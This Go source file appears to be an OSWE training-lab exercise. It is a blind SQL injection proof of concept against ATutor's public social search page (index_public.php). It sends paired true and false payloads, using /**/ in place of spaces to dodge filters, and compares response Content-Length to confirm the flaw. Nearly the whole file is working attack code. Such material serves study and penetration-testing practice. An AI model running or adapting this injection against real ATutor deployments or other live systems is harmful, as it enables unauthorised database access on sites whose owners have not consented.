package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"github.com/iPhantasmic/OSWE/scripts/utils"
	"log"
	"net/http"
	"net/url"
	"os"
)

// Ex 3.5.1 - Comparing HTML Responses

var client *http.Client

const proxyURL = "http://127.0.0.1:8080"

func sendSearchFriendsSQLiV2(debug bool, ip string, sqliPayload string, queryType bool) bool {
	// do necessary URL manipulation
	requestURL := fmt.Sprintf("http://%s/ATutor/mods/_standard/social/index_public.php?q=%s", ip, sqliPayload)

	// send the request
	contentLength := utils.SendGetRequest(client, debug, requestURL).ContentLength

	if queryType && contentLength > 0 {
		return true
	} else if !queryType && contentLength == 0 {
		return true
	}
	return false
}

func main() {
	var tr *http.Transport
	useProxy := flag.Bool("proxy", false, "use proxy")
	debug := flag.Bool("debug", false, "debug mode")
	flag.Parse()
	// parse args
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) < 3 {
		utils.PrintFailure(fmt.Sprintf("usage: %s [-proxy=<proxyIP>] [-debug=true] <target>", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s 192.168.121.103", os.Args[0]))
		os.Exit(1)
	}

	ip := flag.Arg(0)

	if *useProxy {
		// disable TLS verification and set proxy URL
		proxyUrl, _ := url.Parse(proxyURL)
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
			Proxy:              http.ProxyURL(proxyUrl),
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
		}
	}

	// create our HTTP client using the above transport and set the global variable
	client = &http.Client{Transport: tr}

	trueInjectionString := "test')/**/or/**/(select/**/1)=1%23"
	falseInjectionString := "test')/**/or/**/(select/**/1)=0%23"

	if sendSearchFriendsSQLiV2(*debug, ip, trueInjectionString, true) {
		if sendSearchFriendsSQLiV2(*debug, ip, falseInjectionString, false) {
			utils.PrintSuccess("Target is vulnerable to SQLi!")
		}
	}
}
